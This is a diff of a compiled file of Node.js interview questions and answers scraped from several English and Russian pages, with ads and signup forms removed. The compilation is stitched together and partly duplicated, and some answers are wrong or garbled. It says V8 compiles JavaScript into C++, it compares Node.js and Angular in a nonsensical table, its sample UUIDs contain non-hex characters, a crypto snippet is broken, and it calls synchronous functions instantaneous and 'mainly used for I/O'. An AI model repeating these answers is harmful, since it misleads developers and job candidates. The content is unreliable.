-Описание ПО
-Требования к ПО
-Функциональные характеристики
-
-
-
-
-Node.js Interview Questions and Answers
-By Ayaan Alam
-|
-Last updated on January 14, 2026
-|
-89555 Views
- 
-PreviousNext 
-Table of content
-Node JS Interview Questions for Freshers
-Node JS Interview Questions for Experienced 2 to 5 Years
-Node JS Interview Questions 6 to 10 Years Experience
-Node.js Coding Interview Questions
-Node JS Tricky Interview Questions
-The number of Node.js jobs is on the rise, and this puts you up against increased competition. This calls for the most in-depth preparation you can get. This top Node.js interview questions and answers blog is carefully curated to give you answers to some of the most frequently asked questions in a Node.js interview. This blog contains all the frequently asked interview questions from node js basic interview questions to node js coding interview questions which can help you crack your next node js job interview!
-
-Most Frequently Asked Node Js Interview Questions
-
 Briefly explain the working of Node.js.
 Where is Node.js used?
 What is the difference between synchronous and asynchronous functions?
@@ -6597,7 +4733,8 @@ Why is Node.js single-threaded?
 What is the framework that is used most often in Node.js today?
 What is an event loop in Node.js?
 What is the order of execution in control flow statements?
-Node.js Interview Questions for Freshers
+
+
 1. What is the difference between Node.js and JavaScript?
 Factor	Node.js	JavaScript
 Engine	V8 – Google Chrome	V8, Spider Monkey, and JS Core
@@ -6617,6 +4754,7 @@ Distributed computing
 Responsive web apps
 Server-Client applications
 5. What is the difference between Node.js and Angular?
+
 Node.js	Angular
 Used in situations where scalability is a requirement	Best fit for the development of real-time applications
 Ability to generate queries in a database	Ability to simplify an application into the MVC architecture
@@ -6631,17 +4769,6 @@ Synchronous functions are mainly used for I/O operations. They are instantaneous
 
 On the other hand, asynchronous functions, as the name suggests, work on the basis of not being synchronous. Here, HTTP requests, when pushed, will not wait for a response to begin. Responses to any previous requests will be continuous, even if the server has already gotten the response.
 
-Next among the Node JS questions, you have to learn about the control flow function.
-
-Get 100% Hike!
-
-Master Most in Demand Skills Now!
-
-Email Address
-
-+91  IN          INDIA
-Phone Number
-By providing your contact details, you agree to our Terms of Use & Privacy Policy
 7. What is the control flow function?
 The control flow function is a common code snippet, which executes whenever there are any asynchronous function calls made. It is used to evaluate the order in which these functions are executed in Node.js.
 
@@ -6689,7 +4816,6 @@ The require() function is used in Node.js to import modules or files. It loads t
 17. How do you debug Node.js applications?
 Node.js applications can be debugged using built-in debugging tools like “console.log()” statements, the Node.js debugger (node inspect), or using third-party debugging tools like Visual Studio Code with breakpoints.
 
-Node.js Interview Questions for Experienced 2 to 5 Years
 18. Why is Node.js single-threaded?
 Node.js works on the single-threaded model to ensure that there is support for asynchronous processing. With this, it makes it scalable and efficient for applications to provide high performance and efficiency under high amounts of load.
 
@@ -7067,7 +5193,7 @@ ws.on(‘close’, function close() {<br>
 console.log(‘Client disconnected’);<br>
 });<br>
 });<br>
-Node JS Tricky Interview Questions
+
 85. What is NODE_ENV, and how do you use it in Express?
 NODE_ENV is an environment variable frequently utilized in Node.js applications, including those developed with the Express framework. It assists in identifying the current environment of your application, whether it’s for development, production, or testing purposes.
 
@@ -7127,50 +5253,6 @@ Start your application by:
 
 node app.js
 
-Node JS Developer Salary Trends
-The salary of a Node.js developer keeps increasing with time and experience due to the high demand for experienced developers.
-
-Job Role 	Average Salary in India	Average Salary in the USA
-Node.js Developer	Minimum -₹1.2 LPA	Minimum –  34,933 USD
-Average – ₹5.8 LPA	Average – 57,577 USD
-Highest – ₹12 LPA	Highest – 94,900 USD
-Node JS Developer Job Trends
-A Node.js developer is one of the hottest jobs to get in 2026. 
-
-The demand for Node.js developers is constantly increasing in India. Currently, there are 23,000+ open jobs on Naukri and 22,000+ open jobs on LinkedIn. Both are leading job portals in India. 
-Out of these, 7,500+ jobs are entry-level permanent jobs, and approximately 2,000 are internship opportunities.
-If you consider the city-wise distribution of jobs, in Bangalore there are 12,300+, in Hyderabad 6,500+, in Pune 5,200+, and in Mumbai 3,800+ openings.
-According to LinkedIn, there are currently 42,000+ openings in the USA, with approximately 1,960 recent positions.
-Other perks of working on Node.js are as follows:
-Work from Home Opportunities
-Currently, many top companies like Deloitte, Turing, Infosys, Wipro, etc., are offering Work from Home opportunities for Node.js developers.
-High-Paying Salaries
-Even if you start at an average-paying job, you will switch to a high-paying job within a year, as there is a high demand for experienced Node developers.
-Constant Growth
-Node.js development is currently on a rising trend and will be rising in the coming years, as many companies are shifting towards Node.js for full-stack development. These companies include popular names such as Paypal, Walmart, and Netflix.
-Node JS Developer Roles & Responsibilities
-As a Node.js developer, your primary responsibilities will be designing and developing backend systems, along with building RESTful APIs. You will also be expected to write and maintain code with performance optimization duties.
-
-You can refer to this job posting for a Node.js Application Developer posted by Accenture.
-
-NodeJsApplicationDeveloper
-
-A common tech stack for Node.js developers includes-
-
-Java, Javascript, and all the libraries and frameworks related to it
-Backend technologies like Python, PHP, etc.
-Front-end technologies like HTML5, React, etc.
-Familiarity with cloud platforms like AWS, Azure, etc.
-We hope this set of Node.js technical interview questions will help you prepare for your interviews. Best of luck in your endeavors!
-
-What's in it for me?
-We have created this section for your convenience from where you can navigate to all the sections of the article. All you need to just click on the desired section, and it will land you there.
-
-Most Frequently Asked Node.js Interview Questions
-Top 20 Most Popular Node.js Interview Questions
-Advanced Javascript Interview Questions
-Most Frequently Asked Node js Interview Questions
-Here in this article, we will be listing frequently asked Node js Interview Questions and Answers with the belief that they will be helpful for you to gain higher marks. Also, to let you know that this article has been written under the guidance of industry professionals and covered all the current competencies.
 
 Q1. What is Node.js and why it is used?
 Answer
@@ -7266,8 +5348,6 @@ It is a returned value by an asynchronous function to indicate the completion of
 
 var promise = doSomethingAync()
 
-
-
 promise.then(onFulfilled, onRejected)
 
 Q16. What is Stub in Node JS?
@@ -7353,7 +5433,6 @@ flags : It indicates the behavior of the file to be opened
 mode : It sets the file mode like permission
 callback : gets two arguments (err, fd)
 var fs = require("fs");
-
 
 
 // Asynchronous - Open a File
@@ -7925,7 +6004,6 @@ uuid1 v1 => 6bf958f0-95ed-17e8-sds37-23f5ae311cf6
 uuid5 v4 => 356fasda-dad8d-42b7-98b8-a89ab58a645e
 
  
-
 Q77. How will you debug an application in Node.js?
 Answer
 The easiest way to debug an application on Node.js is through Node-Inspector. You can use it from any browser supporting WebSockets. It helps multiple ways of debugging like a profiler, livecoding, breakpoints, etc. Here's how to use node-inspector:
@@ -8156,24 +6234,13 @@ setTimeout(function(){
 console.log("This is third title");
 
 
-
 OUTPUT
-
-
 
 This is first title
 
-
-
 This is third title
 
-
-
 This is second title
-
-
-
- 
 
 Q91. Why node is faster than others?
 Answer
@@ -8187,32 +6254,6 @@ Q92. Why we used async & await?
 Answer
 Async and await are used to make the code easier to write and read. Also, the agenda behind rolling out this feature is to deal with the promises and functions chaining in the Node. Where the functions do not need to be chained just one after another, simply call the await function that returns the promise. On the other hand, the function async should be declared before returning a promise by awaiting a function.
 
-ИИ-интервьюер
-Высокоэффективный инструмент для подготовки к собеседованию
-На базе aspose.com, aspose.net и aspose.cloud
-
-Подготовьтесь к собеседованию на должность разработчика Node.js
-С помощью приложения Node.js Interview у вас будет возможность подготовить и уточнить свои ответы на широкий спектр вопросов, с которыми вы, вероятно, столкнетесь на реальном собеседовании. Просто введите "Программист Node.js" в качестве должности, а ИИ предоставит вам полный список подходящих вопросов для самопроверки.
-
-Для HR-менеджера наше приложение - инструмент создания сценариев собеседований с разработчиком Node.js. Генератор вопросов на основе искусственного интеллекта гарантирует, что вы затронете все важные области - от технических навыков, связанных с Node.js, до поведенческих качеств - для должности, на которую вы нанимаете.
-
-Генератор вопросов для собеседования по Node.js
-В настоящее время рынок труда программистов Node.js является высококонкурентным. Правильная подготовка имеет решающее значение для успеха серьезного соискателя работы.
-
-С помощью этого приложения Node.js Interview вы можете быстро подготовиться и подать заявку на желаемую работу. Просто введите в поле "Разработчик Node.js", добавьте необходимые сведения о должности (например, "Старший", "Средний", "Младший") и нажмите кнопку, чтобы получить список вопросов для собеседования. Используйте их в качестве практики, укрепите уверенность в себе и подготовьтесь к собеседованию максимально эффективно.
-
-Начните свой путь к успешным собеседованиям сегодня с помощью нашего генератора вопросов для собеседований по Node.js!
-
-Как подготовиться к собеседованию по Node.js
-Укажите подробную информацию о желаемой должности (младший, средний, старший).
-Укажите количество вопросов для собеседования по Node.js.
-Нажмите кнопку, чтобы автоматически сгенерировать вопросы для интервью.
-Сохраните вопросы интервью по Node.js в виде документа на своем устройстве.
-
-6 главных вопросов на собеседовании по Node.js
-May 15, 2023
-Что такое цикл событий, как он работает и почему о нем все всегда спрашивают на собеседованиях? Некоторое время я не мог четко ответить на этот вопрос, а уже потом, когда набрался опыта и сам начал нанимать людей, стало понятно, что это реально большой пробел у большинства JavaScript-разработчиков.
-
 1 Что такое Event Loop в Node.js
 Event Loop — это цикл, с помощью которого Node.js может выполнять неблокирующие операции I/O — input/output. И еще очень важно, что Event Loop — это «сердце» большого механизма известной библиотеки libuv. 
 
@@ -8220,8 +6261,6 @@ Event Loop — это цикл, с помощью которого Node.js мо�
 
 
 Фазы — это то, о чем далеко не все знают или говорят, но знание фаз и есть фундамент для понимания последовательности выполнения кода, написанного на JavaScript.
-
-
 
 2 Расскажите о фазах
 Timers: фаза, в которой выполняются коллбэки, запланированы setTimeout()и setInterval().
@@ -8232,13 +6271,10 @@ Check: здесь вызываются setImmediate() callbacks.
 Сlose callbacks: закрывает коллбэки, такие как socket/http/eventEmitter/.on(‘close', () =>).
 С полной информацией о фазах можно ознакомиться здесь.
 
-
-
 3 Что такое микро- и макрозадачи
 разницу между setTimeout()i setImmediate();
 разницу между process.nextTick()и setImmediate();
 какие трудности можно решить с помощью process.nextTick().
-
 
 4 В чем разница между setTimeout() и setImmediate()
 setTimeout() — коллбэк, который мы передаем в таймер, выполняется после определенного пройденного времени, переданного вторым аргументом setTimeout()или при отсутствии указанного времени, по умолчанию через 4 мс.
@@ -8278,13 +6314,10 @@ Timeout
 Timeout
 Immediate
 
-
 5 В чем разница между process.nextTick() и setImmediate()
 В этой ситуации всегда первым выполняется process.nextTick(), он выполняется при следующем тике (tick) ядра вашего компьютера, а это 100-1000 тиков в секунду — и в этом его опасность.
 
 Если вы написали рекурсивную функцию и там есть process.nextTick(), то текущий цикл Event Loop так может и не завершиться, об этом есть предостережение в официальной документации.
-
-
 
 6 Какие трудности можно решить с помощью process.nextTick()
 Есть такие ситуации, когда нам нужно выполнить нашу функцию с минимальной задержкой только после того, как код будет инициализирован, но еще ни одна I/O-операция еще не будет выполнена, и здесь process.nextTick() поможет нам с легкостью:
@@ -8322,25 +6355,6 @@ myEmitter.on('event', () => {
 });
 Если исключить process.nextTick() из нашего примера, то событие event никогда не сработает, потому что вызов произошел еще в конструкторе класса MyEmitter, а регистрация события — позже.
 
-
-
-Вывод
-Если говорить про опыт, то у меня были кандидаты из других стран, которые на вопрос «что такое Event Loop» отвечали так: «Зачем вы задаете мне такой элементарный вопрос, я человек с опытом 5+ лет, и клиент за такие знания не платит, он платит за фичи».
-
-Конечно, все платят за функционал, только вот интересно, сколько будет потрачено времени и каким будет качество кода, если ты не знаешь, как все работает и какая сила в наших руках.
-
-Знание таких вещей как фазы и работа с ними помогает нам понимать более проблемные места в коде, писать код осмысленно и решать более нетривиальные задачи без «костылей», что влияет на надежность и уверенность в работе нашей системы.
-
-Благодарю вас за внимание и продуктивного кодинга 😉
-
-NodeJS Interview Questions and Answers
-Published On: June 10, 2024
-Introduction
-Being proficient in Node.js is essential in building fast, scalable, and data-intensive network applications. This article, which contains Node.js interview questions and answers, will walk you through the core concepts of Node.js, which include the Event Loop, Non-blocking I/O, Middlewares, and Package Management with NPM. Being proficient in Node.js will allow you to build high-performance backend applications, making you an essential resource in today’s fast-paced full-stack or backend development teams.
-
-Want to become a certified backend developer? Want to master server-side JavaScript? Enroll in our professional Nodejs Certification Course in Chennai today and start building high-speed, scalable web applications.
-
-List of NodeJS Interview Questions for Freshers
 What is Node.js?
 What does a JavaScript first-class function mean?
 How do you handle packages in Node.js?
@@ -8354,29 +6368,6 @@ What does a Node.js event loop do?
 How may a basic Express.js application be made?
 What does Node.js’ REPL mean?
 
-Check your knowledge level with our smart Knowledge Assessment Tool
-Instant skill evaluation with accurate scoring
-Identify strengths and learning gaps easily
-Designed for students and working professionals
-Smart assessment to guide your career growth
-Take Your Eligibility Report Instantly
-
-Current Experience Level
-
-Technical Skill Level
-
-Communication Level
-
-Aptitude Level
-
-Do You have IT Training Certificate?
-Your Name
-Your Mobile Number
-
-Submit
-Get started with our NodeJS course syllabus.
-
-NodeJS Interview Questions and Answers for Freshers
 1. What is Node.js?
 A JavaScript engine called Node.js runs JavaScript code outside of a browser. It is scalable and typically used to construct the application’s backend.
 
@@ -8423,39 +6414,6 @@ When an Express application receives an HTTP request, it responds with an HTTP o
 12. What does Node.js’ REPL mean?
 “Read Eval Print Loop,” or REPL, is a symbol representing a computer environment. It is comparable to entering commands in a Unix/Linux shell or Windows console. The system then produces an output in response.
 
-Develop your web development skills with our NodeJS tutorial for beginners.
-
-List of NodeJS Interview Questions for Experienced
-What kinds of HTTP requests are there?
-What distinguishes synchronous from asynchronous functions?
-How can you use Node.js to write Hello World?
-Describe a few clustering techniques for Node.js.
-Explain the various types of Node.js streams.
-How can you use Node.js to read command-line arguments?
-In Node.js, how are environment variables handled?
-Describe the Redis module for Node.js.
-
-Check your knowledge level with our smart Knowledge Assessment Tool -
-Instant skill evaluation with accurate scoring
-Identify strengths and learning gaps easily
-Designed for students and working professionals
-Smart assessment to guide your career growth
-Take Your Eligibility Report Instantly
-
-Current Experience Level
-
-Technical Skill Level
-
-Communication Level
-
-Aptitude Level
-
-Do You have IT Training Certificate?
-Your Name
-Your Mobile Number
-
-Submit
-Explore our NodeJS project ideas to learn more.
 
 NodeJS Technical Interview Questions and Answers for Experienced
 1. What kinds of HTTP requests are there?
@@ -8521,22 +6479,6 @@ An open-source data structure storage system is called Redis. It can be used in 
 Data structures like strings, hashes, sets, sorted sets, bitmaps, indexes, and streams can all be stored in it. 
 Redis is a great tool for Node.js developers since it minimizes cache size, which improves application performance. Still, Redis integration with Node.js apps is rather simple.
 
-Node JS Senior Developer Interview Questions and Answers
-Last updated by Vartika Rai on Sep 22, 2025 at 07:00 PM
-| Reading Time: 7 minutes
-Node.js is an open-source, cross-platform, single-threaded, backend JavaScript runtime environment and library. Node.js executes the JavaScript code outside the client’s web browser and runs on the V8 engine. Since it is single-threaded, Node.js is mainly used for non-blocking, event-driven servers.
-
-Due to its asynchronous and event-driven model, we can use Node.js to create server-side data-intensive applications. We can also use it for developing distributed systems, general-purpose, real-time, and network applications. This article focuses on top Node JS interview questions to help you prepare better, no matter what your level of experience.
-
-Node JS
-DevOps School
-If you are preparing for a tech interview, check out our technical interview checklist, interview questions page, and salary negotiation ebook to get interview-ready! Also, read Amazon Coding Interview Questions, Facebook Coding Interview Questions, and Google Coding Interview Questions for specific insights and guidance on coding interview preparation.
-
-In this article, we present the NodeJS interview questions and answers. These are divided into basic, intermediate, and advanced levels.
-
-Sample Node JS Interview Questions and Answers
-Node JS
-Snaphunt
 1. How does Node.js handle child threads?
 Node.js indeed spawns child threads for some tasks like asynchronous I/O. However, they run behind the scenes without executing any JavaScript code in the application and without blocking the main event loop.
 
@@ -8561,7 +6503,6 @@ Asynchronous, non-blocking, and synchronous blocking functions are the two types
 REPL refers to Read, Eval, Print, and Loop in Node.js.
 
 Basic Node JS Developer Interview Questions for Freshers
-
 
 We start with some basic conceptual Node JS Developer interview questions you should be able to answer before we move ahead. Can you answer them?
 
@@ -8593,8 +6534,6 @@ First class functions
 Fork
 Asynchronous API
 NPM
-Intermediate Node JS Developer Interview Questions For 2 Year Experience
-Let’s move a step further with some intermediate Node JS Developer interview questions for experienced professionals:
 
 Explain the web application architecture of Node.js.
 Expand on the types of API functions available in Node.js.
@@ -8630,8 +6569,6 @@ Is evaluation of simple expressions possible using Node REPL?
 Why is Node.js Single-threaded?
 Which tool would you use to ensure consistent code style in Node.js?
 What purpose does the underscore variable serve in REPL?
-Advanced Node JS Senior Developer Interview Questions for 3-5 Years Experience
-Lastly, here are some advanced Senior Node JS Developer interview questions. Ensure you can solve them before your interview:
 
 How does Node prevent blocking code?
 Why does Google use the V8 engine for Node.js?
@@ -8648,7 +6585,7 @@ What method would you prefer for resolving unhandled exceptions in Node.js?
 How would you implement async in Node.js? Explain the use of async await using an example.
 How does clustering improve the performance in Node.js?
 How does the threadpool work and which library in Node.js takes care of it?
-FAQs on Node JS
+
 Q1. What should a senior Node.js developer know?
 
 A senior Node.js developer should have experience in front-end design and development using HTML and CSS. And a senior Node.js developer must know all crucial JavaScript concepts, have error-handling skills, and need to have RESTful APIs and API communications skills.
@@ -8669,15 +6606,8 @@ Q5. How is Node.js most frequently used?
 
 We use Node.js most frequently in IoT, Complex SPAs, real-time chats, real-time collaboration tools, microservices architecture, and streaming applications.
 
-Ready to Nail Your Next Coding Interview?
-Whether you’re a coding engineer gunning for a software developer or software engineer role, a tech lead, or targeting management positions at top companies, IK offers courses specifically designed for your needs to help you with your technical interview preparation!
-
-If you’re looking for guidance and help with getting started, sign up for our FREE webinar. As pioneers in technical interview preparation, we have trained thousands of software engineers to crack the most challenging coding interviews and land jobs at their dream companies, such as Google, Facebook, Apple, Netflix, Amazon, and more!
-
 Q1. Create a sleep function using Async/Await.
 In the below example, the sleep function returns a promise which is resolved after given millisecond using setTimeout API.
-
-
 
 Q2. How Javascript Engine works?
 When a js file is ran,
@@ -8723,9 +6653,6 @@ Use any profiling tool to check where the execution is lagging.
 
 What is EventEmitter in NodeJS?
 My View: EventEmitter is used to create event listeners in JS.
-
-Node.js Interview Questions and Answers For Freshers
-Start with the fundamentals: core Node.js concepts, basic modules, and how asynchronous JavaScript works. These interview questions in Node.js help you build a strong base before moving to Express, APIs, and real-world use cases.
 
 1. What is Node.js, and where can you use it?
 Node.js is an open-source, cross-platform JavaScript runtime environment and library to run web applications outside the client’s browser. It is used to create server-side web applications.
@@ -9281,22 +7208,6 @@ I’ve built and scaled backend services with Node.js, with a solid grasp of asy
 A highly engaged Reddit discussion titled “Node JS - What is the roadmap in 2026?” shares practical experiences from developers actively working with Node.js.
 Many redditors say that while Node.js remains relevant, interviews now focus more on real-world problem-solving, async behavior, and backend design rather than just theory.
 Key Takeaways
-Interview questions in Node.js mainly check your clarity of concepts and how well you explain your approach, not just whether the answer is correct
-A solid understanding of the event loop, asynchronous programming, streams, modules, and error handling helps you tackle most Node.js interview questions with confidence
-Practicing Node.js interview questions and answers at beginner, intermediate, and experienced levels prepares you for different interview formats and difficulty levels
-Short, structured Node.js courses and hands-on practice can help you build confidence and prepare in a more organized way
-If you want to go beyond quick prep and build job-ready skills in modern web application development, enroll in Simplilearn’s AI-powered Full Stack Developer Program. It strengthens your full-stack foundations and hands-on practice, helping you feel more confident in Node.js interviews.
-
-Top 50 Node.js Interview Questions and Answers [2026]
-Node.js is a JavaScript environment used to execute JavaScript code outside the browser. Based on Chrome’s V8 engine, it represents the JavaScript anywhere and everywhere programming paradigm, unifying web app development to a single language rather than different languages for server and client-side scripting.
-
-LinkedIn, IBM, GoDaddy, Groupon, Netflix, and Paypal all use Node.js. Its increasing popularity has sparked a demand for Node.js developers, which means tons of job opportunities! 
-
-But if you’re nervous about your interview, don’t worry. We’ll help you prepare with these Node.js interview questions. Let’s start with some basic Node js questions for entry-level roles. 
-
-Node.js Interview Questions and Answers
-Node.js Interview Questions for Freshers
-These beginner Node interview questions cover the basic concepts, but it’s important you know them thoroughly.
 
 1. What is Node.js?
 Node.js is a JavaScript runtime environment built with Chrome’s V8 JavaScript engine as a platform. It’s popular because it’s lightweight and efficient, due to its event-driven and non-blocking I/O model. Built with performance as its primary focus, Node.js processes the JavaScript code into the native machine code, which your computer can use to execute processes. 
@@ -9431,9 +7342,6 @@ The npm packages contain a file package.json in the project root folder, which c
 
 15. Describe the error-first callback in Node.js.
 The error-first callback, also called as errorback gives the error and data. It takes a few arguments, the first one being the error object and others being the data. The error-first callback pattern has many advantages: since it is consistent, leads to more adoption, if there is no reference to the data, there is no need to process it. If there is no error, the callback is called with null as the first argument. 
-
-Advanced Node.js Interview Questions for Experienced Professionals
-Now we move onto advanced node interview questions. Remember to be able to put these concepts into practice.
 
 16. Explain the purpose of module.exports.
 These tell Node.js when parts of the code that like objects, functions, strings etc. should be exported from a given file so other files can access it. Suppose we have this module: 
@@ -9739,7 +7647,6 @@ In Node.js, the buffer class stores the raw data, in a manner similar to that of
 
 49. How do the fork and spawn methods work?
  
-
 In Node.js, spawn () launches a new process with the available set of commands. This doesn’t generate a new V8 instance; only a single copy of the node module is active on the processor. This method can be used when your child process returns a large amount of data to the node.
 
 On the other hand, fork () is a particular case of spawn () which generates a new V8 engine instance. Through this method, multiple workers run on a single node code base for multiple tasks.
@@ -9756,15 +7663,6 @@ The application is created inside the package containing the index.html file
 Bonus Tips
 Here are a few extra tips that will make sure you nail that interview.
 
-Focus on Node.js programming interview questions. We’ve made this part easy with our comprehensive list.You’ll find several of these resources online, including on Hackr. As in every tech interview, 
-Practice: Coding on the spot is more nerve-wracking than at leisure, but interviewers need to see your skills in action. Practice a few coding questions to prepare for your interview. 
-Brush up on related tools: It’s important you have experience with other related tech tools and frameworks. that includes MySQL, Mongo or Postgres, and React, Angular, or Backbone for frontend frameworks. 
-Conclusion: Start Preparing for Your Node.js Interview
-With this, we come to the end of our top Node.js interview questions. As you prepare for your Node js interview, consider checking out the best Node.js tutorials, curated by community members. These will all go a long way in helping you in your Node js interview. And if you’re ready to commit to longer-term learning? 
-
-Sign Up For a Node.js Developer Course
-
-Frequently Asked Questions
 1. How Do I Prepare for a Node Interview?
 You can prepare for a Node interview with our comprehensive list of Node js programming interview questions listed above. Set aside time to practice Node.js coding questions as well!
 
@@ -9867,9 +7765,6 @@ A callback is a function called when a task is completed. It allows other code t
 
 51. What is the purpose of NODE_ENV?
 
-Node Js Interview Questions And Answers
-Node.js:
-Ans. Node.js is a server-side JavaScript runtime environment built on the V8 JavaScript engine. It allows developers to run JavaScript on the server side, enabling the development of scalable and high-performance network applications. Node.js is particularly well-suited for building real-time, data-intensive, and event-driven applications.
 Why use Node.js:
 Ans.
 
@@ -10558,10 +8453,6 @@ Q.100. How can you secure a Node.js web application from common security vulnera
 
 Solution: To secure a Node.js web application from common security vulnerabilities, such as XSS and CSRF attacks, developers should follow best practices, such as input validation, output encoding, and session management. They can also use middleware modules, such as Helmet, to add extra security headers to HTTP responses. Additionally, implementing measures such as HTTPS, Content Security Policy (CSP), and rate limiting can help to further enhance the security of the application. It's also essential to keep dependencies up-to-date and regularly perform security audits to identify and address any potential vulnerabilities.
 
-Conclusion
-In conclusion, our extensive guide on 'Node.js interview questions' serves as a valuable resource for developers of all experience levels. By providing a comprehensive list of 100 essential questions spanning from the basics to advanced concepts, this guide is designed to help you navigate the Node.js interview process with confidence and poise.
-
-Remember, practice makes perfect. As you work through these questions and deepen your understanding of Node.js, your confidence will grow, allowing you to tackle even the most challenging interviews. Keep honing your skills, and don't be afraid to revisit this guide whenever you need a refresher. For more fundamental concepts check out our free Node Js Tutorial.
 
 1.    What is Node.Js and its features?
 Node.js is a runtime platform based on the JavaScript engine in Google Chrome. A single thread model loops its events using the concurrency model.
@@ -10593,9 +8484,6 @@ Modular code: This code will be broken into smaller modules and later connected 
 Promise mechanism: This is a different way to write async code. This mechanism ensures either a successful or unsuccessful outcome. They accept two optional arguments, one of which is called depending on the state of promise.
 Use of generators: These routines use the yield keyword to wait and resume. Asynchronous operations can also be suspended and resumed.
 Async mechanism: This method allows for a sequential execution flow. The <async.waterfall> API in this module passes data from one operation to the next using the next callback. The primary method is the caller, which is called only once via a callback.
-Also Read:  How to Transition From Engineering Student to Working Professional
-Advanced Node.js Interview Questions
-Let’s get started:
 
 1.    What is NPM?
 NPM stands for Node Package Manager. It serves two primary purposes:
@@ -10637,23 +8525,6 @@ Our SuperCoders program is for a  hand-picked group of the best students from ac
 
 So, if you want to learn how to code, work on real-world projects, and prepare for future placements, the SuperCoders Program is for you. The goal is to mold students into prompt professionals while also developing their personalities.
 
-Master Node.js (with Express) Interview Questions
-Node.js with Express is a popular stack for building scalable web applications. This comprehensive guide covers essential interview questions for junior, intermediate, and senior roles, helping you prepare for your next job interview.
-
-Get Prepared for Your Node.js Interview!
-Node.js at codeinterview
-Your Ultimate Guide to Node.js Interview Success
-Introduction to Node.js with Express
-Node.js is a runtime environment that allows you to run JavaScript on the server side. Built on Chrome's V8 JavaScript engine, Node.js is designed for building scalable network applications. Express.js is a minimal and flexible Node.js web application framework that provides a robust set of features for web and mobile applications. It simplifies routing, middleware management, and request handling, making it a go-to choice for developers working on server-side applications.
-
-Table of Contents
-Junior-Level Node.js Interview Questions
-Mid-Level Node.js Interview Questions
-Expert-Level Node.js Interview Questions
-Proven Strategies and Best Practices for Node.js Interview
-
-Junior-Level Node.js Interview Questions
-Here are some junior-level interview questions for Node.js with Express:
 
 Question 01: What is Node.js, and how does it work?
 
@@ -10892,10 +8763,6 @@ Question 10: How can you optimize the performance of a Node.js (with Express) ap
 Answer: To optimize the performance of a Node.js (with Express) application, you can implement techniques such as caching, using a load balancer, optimizing database queries, using compression middleware, minimizing middleware usage, and ensuring non-blocking code. Additionally, profiling and monitoring the application can help identify and address performance bottlenecks.
 
 
-
-Expert-Level Node.js Interview Questions
-Here are some expert-level interview questions for Node.js with Express:
-
 Question 01: Explain the event loop in Node.js and how it handles asynchronous operations.
 
 Answer: The event loop is a core concept in Node.js that allows it to handle asynchronous operations in a non-blocking manner. It is a single-threaded loop that continuously checks for events, processes them, and delegates I/O operations to the system's kernel whenever possible. The event loop has several phases, including timers, pending callbacks, idle, poll, check, and close callbacks.
@@ -10991,25 +8858,8 @@ Question 10: What are some strategies for ensuring the security of a Node.js (wi
 Answer: Strategies for ensuring the security of a Node.js (with Express) application include using HTTPS, validating and sanitizing user inputs, implementing authentication and authorization, protecting against common web vulnerabilities (XSS, CSRF, SQL injection), using security headers with helmet, managing environment variables securely, and keeping dependencies up to date. Additionally, performing regular security audits and code reviews can help identify and address potential security issues.
 
 
-
-Ace Your Node.js Interview: Proven Strategies and Best Practices
-To excel in a Node.js technical interview, it's crucial to have a strong grasp of the language's core concepts. This includes a deep understanding of syntax and semantics, data types, and control structures. Additionally, mastering Node.js approach to error handling is essential for writing robust and reliable code. Understanding concurrency and parallelism can set you apart, as these skills are highly valued in many programming languages.
-
-Core Language Concepts: Syntax, semantics, data types (built-in and composite), control structures, and error handling.
-Concurrency and Parallelism: Creating and managing threads, using communication mechanisms like channels and locks, and understanding synchronization primitives.
-Standard Library and Packages: Familiarity with the language's standard library and commonly used packages, covering basic to advanced functionality.
-Practical Experience: Building and contributing to projects, solving real-world problems, and showcasing hands-on experience with the language.
-Testing and Debugging: Writing unit, integration, and performance tests, and using debugging tools and techniques specific to the language.
-Practical experience is invaluable when preparing for a technical interview. Building and contributing to projects, whether personal, open-source, or professional, helps solidify your understanding and showcases your ability to apply theoretical knowledge to real-world problems. Additionally, demonstrating your ability to effectively test and debug your applications can highlight your commitment to code quality and robustness.
-
-Node.js interview questions for junior developers
-Use the following Node.js interview questions when evaluating junior Node.js programmers:
-
 Question 1: How does a “callback” work in Node.js?
 
-Designer illustration
-Get a complimentary discovery call and a free ballpark estimate for your project
-Trusted by 100x of startups and companies like
 Answer: “Callback” is a function in Node.js. A program calls it after a task. This allows the program to run another piece of code at that time, and there’s no blocking. Node.js supports asynchronous processing. This depends on the callback functions, and the Node.js APIs support this function.
 
 Question 2: Explain the differences between Node.js and JavaScript.
@@ -11258,7 +9108,6 @@ However, Node.js isn’t based on JavaScript alone. This runtime environment is 
 The V8 JavaScript engine compiles JavaScript code into C++. Furthermore, Node.js utilizes “Libuv” when accessing native modules like “fs” and “crypto”. Through “Libuv”, Node.js gets access to the multi-threading capabilities of the underlying operating system.
 
 An example of multi-threading in Node.js is in the following code snippet where the “crypto” module is used. Note that this code snippet uses the hashing capabilities, and it uses the “pbkdf2” function from the “crypto” module.
-
 
 Copy
 <i>Const { pbkdfs } = require(‘crypto’);</i>
@@ -11571,10 +9420,6 @@ Question 10: How can you optimize the performance of a Node.js (with Express) ap
 Answer: To optimize the performance of a Node.js (with Express) application, you can implement techniques such as caching, using a load balancer, optimizing database queries, using compression middleware, minimizing middleware usage, and ensuring non-blocking code. Additionally, profiling and monitoring the application can help identify and address performance bottlenecks.
 
 
-
-Expert-Level Node.js Interview Questions
-Here are some expert-level interview questions for Node.js with Express:
-
 Question 01: Explain the event loop in Node.js and how it handles asynchronous operations.
 
 Answer: The event loop is a core concept in Node.js that allows it to handle asynchronous operations in a non-blocking manner. It is a single-threaded loop that continuously checks for events, processes them, and delegates I/O operations to the system's kernel whenever possible. The event loop has several phases, including timers, pending callbacks, idle, poll, check, and close callbacks.
@@ -11668,33 +9513,6 @@ PM2 enhances scalability through load balancing and cluster mode, running multip
 Question 10: What are some strategies for ensuring the security of a Node.js (with Express) application?
 
 Answer: Strategies for ensuring the security of a Node.js (with Express) application include using HTTPS, validating and sanitizing user inputs, implementing authentication and authorization, protecting against common web vulnerabilities (XSS, CSRF, SQL injection), using security headers with helmet, managing environment variables securely, and keeping dependencies up to date. Additionally, performing regular security audits and code reviews can help identify and address potential security issues.
-
-
-
-Ace Your Node.js Interview: Proven Strategies and Best Practices
-To excel in a Node.js technical interview, it's crucial to have a strong grasp of the language's core concepts. This includes a deep understanding of syntax and semantics, data types, and control structures. Additionally, mastering Node.js approach to error handling is essential for writing robust and reliable code. Understanding concurrency and parallelism can set you apart, as these skills are highly valued in many programming languages.
-
-Core Language Concepts: Syntax, semantics, data types (built-in and composite), control structures, and error handling.
-Concurrency and Parallelism: Creating and managing threads, using communication mechanisms like channels and locks, and understanding synchronization primitives.
